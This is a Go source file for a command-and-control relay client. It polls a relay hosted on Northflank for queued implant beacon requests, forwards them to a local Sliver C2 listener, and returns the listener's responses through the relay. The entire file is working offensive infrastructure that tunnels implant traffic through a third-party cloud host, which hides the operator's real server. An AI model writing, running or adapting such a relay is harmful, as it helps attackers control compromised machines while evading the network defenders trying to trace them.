// C2 relay client — runs on your PC.
// Polls the Northflank relay for queued beacon requests,
// forwards them to your local Sliver HTTP listener,
// and sends the response back to the relay.
package main

import (
	"bytes"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"time"
)

func main() {
	relay := flag.String("relay", "", "relay server URL (e.g. https://xxx.northflank.app)")
	sliver := flag.String("sliver", "http://127.0.0.1:80", "local Sliver HTTP listener")
	secret := flag.String("secret", "changeme", "relay auth secret")
	flag.Parse()

	if *relay == "" {
		log.Fatal("usage: relay-client -relay https://your-relay.northflank.app -secret <secret>")
	}

	httpClient := &http.Client{Timeout: 60 * time.Second}
	log.Printf("relay client started — polling %s -> forwarding to %s", *relay, *sliver)

	for {
		err := poll(httpClient, *relay, *sliver, *secret)
		if err != nil {
			log.Printf("poll error: %v", err)
			time.Sleep(2 * time.Second)
		}
	}
}

func poll(c *http.Client, relayURL, sliverURL, secret string) error {
	req, _ := http.NewRequest("GET", relayURL+"/relay/poll", nil)
	req.Header.Set("X-Secret", secret)

	resp, err := c.Do(req)
	if err != nil {
		return fmt.Errorf("poll: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode == 204 {
		return nil // no pending requests
	}
	if resp.StatusCode == 401 {
		return fmt.Errorf("unauthorized — check your secret")
	}
	if resp.StatusCode != 200 {
		return fmt.Errorf("poll returned %d", resp.StatusCode)
	}

	id := resp.Header.Get("X-Relay-Id")
	method := resp.Header.Get("X-Relay-Method")
	path := resp.Header.Get("X-Relay-Path")
	body, _ := io.ReadAll(resp.Body)

	log.Printf("[%s] %s %s (%d bytes) — forwarding to sliver", id, method, path, len(body))

	// Forward to local Sliver
	fwdReq, _ := http.NewRequest(method, sliverURL+path, bytes.NewReader(body))
	for k, vs := range resp.Header {
		if len(k) > 7 && k[:7] == "X-Orig-" {
			for _, v := range vs {
				fwdReq.Header.Add(k[7:], v)
			}
		}
	}

	sliverResp, err := c.Do(fwdReq)
	if err != nil {
		return fmt.Errorf("[%s] forward to sliver: %w", id, err)
	}
	defer sliverResp.Body.Close()
	sliverBody, _ := io.ReadAll(sliverResp.Body)

	log.Printf("[%s] sliver responded %d (%d bytes) — sending back", id, sliverResp.StatusCode, len(sliverBody))

	// Send response back to relay
	respReq, _ := http.NewRequest("POST", relayURL+"/relay/respond/"+id, bytes.NewReader(sliverBody))
	respReq.Header.Set("X-Secret", secret)
	respReq.Header.Set("X-Relay-Status", fmt.Sprintf("%d", sliverResp.StatusCode))
	for k, vs := range sliverResp.Header {
		for _, v := range vs {
			respReq.Header.Add("X-Orig-"+k, v)
		}
	}

	respResp, err := c.Do(respReq)
	if err != nil {
		return fmt.Errorf("[%s] respond: %w", id, err)
	}
	respResp.Body.Close()

	return nil
}
